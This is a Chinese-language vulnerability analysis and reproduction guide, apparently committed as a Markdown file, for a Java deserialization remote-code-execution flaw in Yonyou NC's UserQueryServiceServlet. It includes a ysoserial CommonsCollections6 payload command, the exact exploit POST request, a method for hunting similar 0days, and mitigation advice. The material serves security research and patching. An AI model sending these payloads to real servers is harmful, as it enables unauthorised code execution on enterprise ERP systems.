@@ -1,0 +1,182 @@
+> 本文档旨在提供一份关于用友 NC（Yonyou NC）系统特定反序列化漏洞的深度分析、复现流程及代码审计指南。通过结合理论与实践，帮助安全研究人员和开发人员理解漏洞成因，掌握挖掘同类漏洞的方法。
+
+## 1. 概述
+
+用友 NC 是一款广泛应用于大型企业的企业级管理软件（ERP）。由于其系统复杂、功能众多，历史上曾暴露过多个安全漏洞。本文重点关注一个通过特定 Servlet 接口触发的 Java 反序列化漏洞。攻击者可利用此漏洞，在未经授权的情况下，向目标服务器发送恶意构造的序列化数据，从而实现远程代码执行（RCE），对服务器构成严重威胁。
+
+本文将从漏洞的技术原理入手，详细阐述攻击流程，提供环境搭建与实战复现步骤，并最终延伸至如何进行代码审计以挖掘类似的 0day 漏洞。
+
+## 2. 技术原理
+
+该漏洞的核心在于用友 NC 系统中的一个名为 `nc.bs.pub.im.UserQueryServiceServlet` 的 Servlet 组件。此 Servlet 在处理 HTTP POST 请求时，会直接读取请求体中的二进制数据，并调用 `ObjectInputStream.readObject()` 方法进行反序列化，但并未对输入数据进行充分的校验和过滤。这就为攻击者利用 Java 通用的反序列化攻击链（如 CommonsCollections）创造了条件。
+
+### 2.1 路由分发机制
+
+在分析具体漏洞点之前，有必要了解用友 NC 的请求分发机制。系统通过一个核心的 `InvokerServlet` 来统一处理特定路径的请求。
+
+-   **`InvokerServlet` 的作用**：该 Servlet 充当一个请求分发器。当一个请求的 URL 路径以 `/~` 开头时，`InvokerServlet` 会被触发。
+-   **路由解析**：它会解析 URL，将 `/~` 后的第一部分作为模块名（`moduleName`），第二部分作为服务名（`serviceName`）。
+-   **动态调用**：随后，它通过 `getServiceObject(moduleName, serviceName)` 方法动态地获取并实例化对应的 Servlet 服务，最终调用其 `doPost` 或 `doGet` 方法。
+
+例如，对于请求 `POST /servlet/~uapim/nc.bs.pub.im.UserQueryServiceServlet`：
+-   `moduleName` 会被解析为 `uapim`。
+-   `serviceName` 会被解析为 `nc.bs.pub.im.UserQueryServiceServlet`。
+
+这个机制使得攻击者能够直接访问到深层次的、本应被保护的内部 Servlet。
+
+### 2.2 反序列化触发点
+
+漏洞的直接触发点位于 `UserQueryServiceServlet` 的 `doPost` 方法中。该方法的简化逻辑如下：
+
+```java
+// nc.bs.pub.im.UserQueryServiceServlet#doPost
+protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    // ... 省略部分代码 ...
+    ServletInputStream inputStream = request.getInputStream();
+    ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
+    try {
+        // 直接从 HTTP 请求体中读取对象，没有安全检查
+        Object obj = objectInputStream.readObject();
+        // ... 后续处理逻辑 ...
+    } catch (ClassNotFoundException e) {
+        // ... 异常处理 ...
+    } finally {
+        objectInputStream.close();
+    }
+    // ... 省略部分代码 ...
+}
+```
+
+从代码中可以清晰地看到，`readObject()` 方法直接处理了来自客户端的输入流，这是典型的反序列化漏洞场景。
+
+## 3. 环境准备
+
+要复现此漏洞，需要搭建一个包含漏洞版本的用友 NC 环境。
+
+1.  **下载用友 NC 环境包**：
+    您可以从以下社区分享的链接中获取相关的环境资源与源码。
+    - 阿里云先知社区：[https://xz.aliyun.com/t/7837](https://xz.aliyun.com/t/7837)
+    - 补天漏洞响应平台：[https://forum.butian.net/share/3058](https://forum.butian.net/share/3058)
+
+2.  **配置 JDK 版本**：
+    用友 NC 系统对 JDK 版本有严格要求。**务必使用环境包中指定的 JDK 版本**（例如 JDK 1.6 或特定小版本的 JDK 1.7）。同时，需要正确配置系统的 `JAVA_HOME` 环境变量，并确保 `PATH` 变量指向该 JDK 的 `bin` 目录。
+
+3.  **启动 NC 环境**：
+    根据环境包内的说明文档，启动用友 NC 服务器。通常是运行 `startup.bat` 或类似的脚本。启动成功后，通过访问指定的端口（如 80）确认服务是否正常运行。
+
+## 4. 实战示例：远程代码执行
+
+以下步骤演示了如何利用 `ysoserial` 工具生成恶意的序列化 payload，并通过 HTTP 请求发送给目标服务器，最终在服务器上执行 `calc.exe`（计算器）程序。
+
+### 4.1 生成 Payload
+
+使用 `ysoserial` 工具和 `CommonsCollections6` 利用链来生成 payload。`CommonsCollections6` 是一个常见且有效的 Java 反序列化利用链。
+
+**命令：**
+
+```bash
+# 语法: <java_path> -jar ysoserial.jar <gadget_chain> "<command>" > <output_file>
+# 示例:
+d:\jdk1.8.0_65\bin\java.exe -jar ysoserial.jar CommonsCollections6 "calc" > payload.bin
+```
+
+**说明：**
+-   `d:\jdk1.8.0_65\bin\java.exe`: 执行 `ysoserial` 的 Java 环境路径，版本不影响 payload 生成。
+-   `ysoserial.jar`: Java 反序列化 payload 生成工具。
+-   `CommonsCollections6`: 指定使用的 gadget chain。
+-   `"calc"`: 希望在目标服务器上执行的命令。
+-   `payload.bin`: 保存生成的二进制 payload 的文件名。
+
+### 4.2 发送攻击请求
+
+使用 `curl` 或 Burp Suite 等工具，向目标服务器的漏洞接口发送一个 POST 请求，并将 `payload.bin` 的内容作为请求体。
+
+**HTTP 请求示例：**
+
+```http
+POST /servlet/~uapim/nc.bs.pub.im.UserQueryServiceServlet HTTP/1.1
+Host: <target_ip>:<target_port>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Content-Type: application/octet-stream
+Content-Length: [length_of_payload.bin]
+
+[此处为 payload.bin 文件的二进制内容]
+```
+
+**操作流程：**
+1.  将 `payload.bin` 的内容复制到请求体中。
+2.  将 `Host` 替换为目标服务器的 IP 地址和端口。
+3.  发送请求。
+
+如果目标服务器存在漏洞且网络出向策略允许，服务器将会执行 `calc` 命令，弹出计算器窗口，证明远程代码执行成功。
+
+## 5. 关键细节与代码审计
+
+为了从根本上理解漏洞并挖掘同类问题，我们需要深入进行代码审计。
+
+### 5.1 快速定位潜在漏洞点
+
+在大型 JavaEE 项目中，手动查找所有 `readObject()` 调用是不现实的。我们可以利用命令行工具在反编译后的 `.jar` 文件中进行快速检索。
+
+**1. 定位路由分发 Servlet：**
+首先，找到处理请求分发的 `InvokerServlet`，确认其是否存在以及其映射路径。
+
+```bash
+# 在所有 .jar 文件中搜索包含 "InvokerServlet" 字符串的文件
+findstr /msi /c:"InvokerServlet" *.jar
+```
+
+**2. 定位目标漏洞 Servlet：**
+确认 `UserQueryServiceServlet` 存在于哪个包中。
+
+```bash
+# 在所有 .jar 文件中搜索包含 "UserQueryServiceServlet" 字符串的文件
+findstr /msi /c:"UserQueryServiceServlet" *.jar
+```
+
+**3. 批量搜索危险函数 `readObject()`：**
+这是挖掘同类漏洞最关键的一步。在所有 `.jar` 文件中搜索调用了 `ObjectInputStream.readObject()` 的类。
+
+```bash
+# 在所有 .jar 文件中搜索包含 "ObjectInputStream.readObject" 字符串的文件
+findstr /msi /c:"ObjectInputStream.readObject" *.jar
+```
+
+### 5.2 拓展 0day 挖掘思路
+
+通过上述搜索，我们可能会发现除了 `UserQueryServiceServlet` 之外，还有其他 Servlet 也调用了 `readObject()`。例如，`UserAuthenticationServlet` 等其他自定义 Servlet 都可能是潜在的攻击目标。
+
+**审计流程：**
+1.  **识别入口点**：找到所有继承自 `HttpServlet` 并可通过 `InvokerServlet` 访问的类。
+2.  **检查数据处理**：分析这些类的 `doPost` 或 `doGet` 方法，重点关注处理 HTTP 请求体的代码。
+3.  **定位危险函数**：确认是否存在对 `ObjectInputStream.readObject()` 的调用。
+4.  **验证可利用性**：检查调用 `readObject()` 之前是否有任何形式的输入验证、类型检查或黑白名单过滤。如果没有任何防护措施，那么该点很可能就是一个新的 0day 漏洞。
+
+### 5.3 使用专业工具进行深度审计
+
+为了进行更全面、高效的审计，建议将所有相关的 `.jar` 文件反编译，并将源码导入到 IDE（如 IntelliJ IDEA）中。这有助于我们理解代码上下文、跟踪数据流以及进行交叉引用。
+
+推荐使用 **`jar-analyzer`** 等自动化代码审计工具，它可以帮助我们快速发现和分析 Java 反序列化利用链。
+
+-   **项目地址**：[https://github.com/jar-analyzer/jar-analyzer](https://github.com/jar-analyzer/jar-analyzer)
+
+**使用 IDEA 和 `jar-analyzer` 的优势：**
+-   **全局搜索**：可以轻松搜索方法调用、类实现和字符串引用。
+-   **调用链分析**：能够清晰地看到从请求入口到漏洞触发点的完整调用栈。
+-   **依赖关系可视化**：更好地理解项目结构和模块间的交互。
+
+## 6. 安全总结与修复建议
+
+用友 NC 的这个反序列化漏洞是一个典型的因不安全使用 `readObject()` 而导致的严重安全问题。它揭示了在开发大型 JavaEE 应用时，必须对任何来自外部的输入保持警惕。
+
+**核心问题：**
+-   **信任边界不清**：系统过度信任了来自客户端的序列化数据。
+-   **危险函数滥用**：直接对未经验证的数据流使用 `readObject()`。
+-   **路由暴露过多**：`InvokerServlet` 的设计使得内部服务可以被轻易访问。
+
+**修复与缓解措施：**
+1.  **禁止不必要的 Servlet 暴露**：通过配置 `web.xml` 或其他访问控制策略，限制对 `UserQueryServiceServlet` 等高危 Servlet 的直接访问。
+2.  **替换序列化协议**：优先使用更安全的序列化格式，如 JSON 或 Protobuf，避免使用 Java 原生序列化。
+3.  **实现安全的反序列化**：如果必须使用 Java 序列化，应重写 `ObjectInputStream` 的 `resolveClass` 方法，实现一个白名单机制，只允许反序列化已知的、安全的类。
+4.  **部署 RASP 或 WAF**：在运行时通过 RASP（运行时应用自我保护）检测和阻断恶意的反序列化行为，或使用 WAF（Web 应用防火墙）过滤已知的攻击特征。
+5.  **升级官方补丁**：及时关注厂商发布的安全公告，并尽快安装相应的安全补丁。
